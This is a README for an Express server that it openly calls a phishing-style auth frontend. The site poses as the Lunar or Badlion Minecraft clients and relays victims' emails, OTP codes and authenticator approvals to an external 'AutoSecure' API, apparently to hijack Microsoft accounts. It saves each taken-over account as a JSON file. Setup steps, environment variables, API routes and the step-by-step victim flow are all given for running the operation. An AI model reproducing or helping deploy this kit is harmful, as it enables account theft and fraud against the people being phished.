# AutoSecure Site

Express server that proxies a phishing-style auth frontend to the AutoSecure WebSocket API. Secured accounts are saved as JSON files.

## Setup

```bash
git clone <repo-url>
cd retardedsite
npm install
```

## Configuration

Copy the example env file and fill in your values:

```bash
cp .env.example .env
```

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `API_KEY` | Yes | — | Your AutoSecure API key (`sk_...`) with WebSocket access enabled |
| `PORT` | No | `3000` | Port the server listens on |
| `WS_URL` | No | `wss://secured.wtf/api/` | AutoSecure WebSocket endpoint |
| `DOMAIN` | No | — | Domain for email aliases during secure operations |

## Running

```bash
# Production
npm start

# Development (auto-restart on file changes)
npm run dev
```

## Project Structure

```
.
├── main.js              # Express server + WS proxy routes
├── package.json
├── .env.example
├── accounts/            # Secured account JSONs saved here
└── public/
    ├── index.html       # Auth frontend
    ├── main.js          # Client-side auth flow logic
    └── imgs/
        ├── lunar.png    # Lunar Client logo (add your own)
        └── badlion.png  # Badlion Client logo
```

## How It Works

1. User visits the site and enters their email
2. Server connects to AutoSecure via WebSocket, calls `getproofs`
3. If OTP flow: server sends OTP to the user's proof, user enters the code, server calls the `otp` secure event
4. If auth app flow: server returns the entropy number, frontend polls `/api/verification/auth`, server calls `authapp` then `msaauth`
5. On successful secure, the full response JSON is saved to `/accounts/{name}_{timestamp}.json`

## API Routes

| Method | Route | Description |
|--------|-------|-------------|
| `POST` | `/api/verification/email` | Start auth flow — gets proofs, sends OTP or returns entropy |
| `POST` | `/api/verification/otp` | Submit OTP code — secures the account (300s timeout) |
| `POST` | `/api/verification/auth` | Poll auth app status — secures via msaauth on approval |
| `GET`  | `*` | Serves `index.html` for all other routes |

## Notes

- The frontend auto-brands based on hostname (`lunar` or `badlion` in the URL)
- You need to provide your own `public/imgs/lunar.png` for Lunar branding
- Sessions auto-expire after 10 minutes
- Only successfully secured accounts are saved to `/accounts/`
